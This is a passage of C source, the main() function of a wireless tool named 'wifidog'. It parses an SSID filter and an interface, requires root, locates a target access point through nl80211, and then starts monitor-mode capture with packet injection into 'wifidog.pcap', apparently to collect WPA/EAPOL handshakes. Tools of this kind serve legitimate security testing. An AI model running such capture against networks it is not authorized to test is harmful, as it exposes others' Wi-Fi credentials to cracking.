	static const struct option long_options[] = {
		{"ssid", required_argument, NULL, WD_SSID},
		{"version", no_argument, NULL, WD_VERSION},
		{"help", no_argument, NULL, WD_HELP},
		{NULL, 0, NULL, 0}
	};

	auswahl = -1;
	index = 0;
	optind = 1;
	optopt = 0;

	gpiostatusled = 0;
	gpiobutton = 0;

	while ((auswahl =
		getopt_long(argc, argv, short_options, long_options,
			    &index)) != -1) {
		switch (auswahl) {
		case WD_SSID:
			filterssid = optarg;
			break;

		case WD_VERSION:
			version(basename(argv[0]));
			break;

		case WD_HELP:
			usage(basename(argv[0]));
			break;

		case 'i':
			interfacename = optarg;
			break;

		case '?':
			usageerror(basename(argv[0]));
			break;
		}
	}

	if (argc < 2) {
		fprintf(stderr, "no option selected\n");
		return EXIT_SUCCESS;
	}

	if (interfacename == NULL) {
		fprintf(stderr, "no interface selected\n");
		exit(EXIT_FAILURE);
	}

	/* NeoJou : pre-setting */
	pcapngoutname = strdup("wifidog.pcap");
	statusout = STATUS_EAPOL;

	if_index = if_nametoindex(interfacename);
	socket = nl_socket_alloc();
	genl_connect(socket);
	driver_id = genl_ctrl_resolve(socket, "nl80211");

	if (getuid() != 0) {
		fprintf(stderr, "this program requires root privileges\n");
		exit(EXIT_FAILURE);
	}

	if (testinterface() == false) {
		fprintf(stderr,
			"interface is not suitable\nwifidog need full (monitor mode and full packet injection running all packet types) and exclusive access to the adapter\nthat is not the case\n");
		exit(EXIT_FAILURE);
	}

	if (ignorewarningflag == true) {
		printf
		    ("warnings are ignored - interface may not work as expected - do not report issues!\n");
	}

	filterchannel = 0;
	err = do_scan_trigger(socket, if_index, driver_id, filterssid);
	if (err != 0) {
		printf("do_scan_trigger() failed with %d. \n", err);
		goto exit;
	}

	struct nl_msg *msg = nlmsg_alloc();
	genlmsg_put(msg, 0, 0, driver_id, 0, NLM_F_DUMP, NL80211_CMD_GET_SCAN, 0);
	nla_put_u32(msg, NL80211_ATTR_IFINDEX, if_index);
	nl_socket_modify_cb(socket, NL_CB_VALID, NL_CB_CUSTOM, callback_dump, NULL);

	int ret = nl_send_auto(socket, msg);
	ret = nl_recvmsgs_default(socket);
	nlmsg_free(msg);
	if (ret < 0) {
		printf("ERROR: nl_recvmsgs_default() return %d (%s).\n", 
		       ret, nl_geterror(-ret));
		return ret;
	}

	if (filterchannel == 0) {
		printf("ERROR: cannot find AP\n");
		return 0;
	}

	printf("initialization...\n");
	if (opensocket() == false) {
		fprintf(stderr,
			"failed to init socket\nwifidog need full (monitor mode and full packet injection running all packet types) and exclusive access to the adapter\nthat is not the case\n");
		if (fd_socket > 0) {
			memset(&ifr, 0, sizeof(ifr));
			strncpy(ifr.ifr_name, interfacename, IFNAMSIZ - 1);
			ioctl(fd_socket, SIOCSIFFLAGS, &ifr);
			ioctl(fd_socket, SIOCSIWMODE, &iwr_old);
			ioctl(fd_socket, SIOCSIFFLAGS, &ifr_old);
			close(fd_socket);
		}
		if (fd_socket_gpsd > 0) {
			close(fd_socket_gpsd);
		}
		exit(EXIT_FAILURE);
	}

	if (globalinit() == false) {
		fprintf(stderr,
			"failed to init globals\nwifidog need full (monitor mode and full packet injection running all packet types) and exclusive access to the adapter\nthat is not the case\n");
		if (fd_socket > 0) {
			memset(&ifr, 0, sizeof(ifr));
			strncpy(ifr.ifr_name, interfacename, IFNAMSIZ - 1);
			ioctl(fd_socket, SIOCSIFFLAGS, &ifr);
			ioctl(fd_socket, SIOCSIWMODE, &iwr_old);
			ioctl(fd_socket, SIOCSIFFLAGS, &ifr_old);
			close(fd_socket);
		}
		if (fd_socket_gpsd > 0) {
			close(fd_socket_gpsd);
		}
		exit(EXIT_FAILURE);
	}

	test_channels(filterchannel);

	if (rcascanflag == false) {
		processpackets(filterchannel);
	} else {
		processrcascan(filterchannel);
	}

exit:
	globalclose();

	return err; 
}

/*===========================================================================*/
